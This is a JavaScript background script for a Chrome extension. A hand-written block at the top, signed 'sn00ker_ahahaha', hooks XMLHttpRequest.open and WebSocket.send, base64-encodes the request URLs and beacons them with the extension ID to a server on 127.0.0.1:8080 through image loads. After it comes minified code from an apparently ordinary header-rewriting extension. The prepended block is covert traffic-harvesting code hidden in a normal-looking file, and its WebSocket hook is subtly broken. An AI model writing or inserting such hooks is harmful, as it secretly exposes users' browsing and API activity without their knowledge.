function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
function _isApplicableMatch(b,a){if(!a){return false}var d=findHostname(a);var c=new RegExp(b);return(c.test(a)||c.test(d)||b==d||b==a||a.indexOf(b)>-1)}function getHotSwitches(){var b=getSwitchList();var c=[];for(var a=0;a<hotlist_indices.length;a++){c.push(b[hotlist_indices[a]])}return c}function getSwitchesForUrl(c){var f=[];var e=getPresetSwitchList();for(var d=0;d<e.length;d++){if(c&&e[d]&&e[d].domain&&e[d].header_switch&&_isApplicableMatch(e[d].domain,c)){f.push(e[d].header_switch)}}var a=getHotSwitches();for(var b=0;b<a.length;b++){f.push(a[b])}return f}function updateBadge(){chrome.tabs.getSelected(null,function(b){var a=getSwitchesForUrl(b.url);chrome.browserAction.setBadgeText({tabId:b.tabId,text:((a&&a.length>0)?"!":"")})})}chrome.tabs.onSelectionChanged.addListener(function(a,b){updateBadge()});chrome.tabs.onUpdated.addListener(function(b,a,c){updateBadge()});chrome.extension.onRequest.addListener(function(c,b,a){if(c.action=="hotlist"){a({list:JSON.stringify(hotlist_indices)});updateBadge()}else{if(c.action=="set"){toggleHotlistIndex(c.index);updateBadge()}else{if(c.action=="badge"){updateBadge()}else{console.log("Got an invalid request.");a({})}}}});var requestListener=null;function replaceHeader(a,b){var d=[];var h=getSwitchesForUrl(a);var m=findHostname(a);var c={};for(var f=0;f<b.length;f++){if(!(b[f].name in c)){c[b[f].name]=new Array()}c[b[f].name].push(b[f].value)}for(var g=0;g<h.length;g++){if(!(h[g].header in c)){c[h[g].header]=new Array()}if(h[g].append){var l=c[h[g].header];delete c[h[g].header];if(l.length>0){for(var e=0;e<l.length;e++){if(_hasMatchingValue(l[e],h[g].regex)){d.push({name:h[g].header,value:replaceVariables(a,l[e]+" "+h[g].string)})}}}else{if(_hasMatchingValue("",h[g].regex)){d.push({name:h[g].header,value:replaceVariables(a,h[g].string)})}}}else{if(_hasMatchingValue(c[h[g].header],h[g].regex)){d.push({name:h[g].header,value:replaceVariables(a,h[g].string)});delete c[h[g].header]}}}for(var n in c){c[n].forEach(function(j,i,k){d.push({name:n,value:j})})}return d}function _hasMatchingValue(c,b){if(!b||!c||b==""){return true}if(c.length&&c.length>0){for(var a=0;a<c.length;a++){if((new RegExp(b)).test(c[a])){return true}}}else{if((new RegExp(b)).test(c)){return true}}return false}function updateListeners(){requestListener=function(a){return{requestHeaders:replaceHeader(a.url,a.requestHeaders)}};responseListener=function(a){return{responseHeaders:replaceHeader(a.url,a.responseHeaders)}};chrome.webRequest.onBeforeSendHeaders.addListener(requestListener,{urls:["<all_urls>"],types:["main_frame","sub_frame","stylesheet","script","image","object","xmlhttprequest","other"]},["requestHeaders","blocking"]);chrome.webRequest.onHeadersReceived.addListener(responseListener,{urls:["<all_urls>"],types:["main_frame","sub_frame","stylesheet","script","image","object","xmlhttprequest","other"]},["responseHeaders","blocking"])}updateListeners();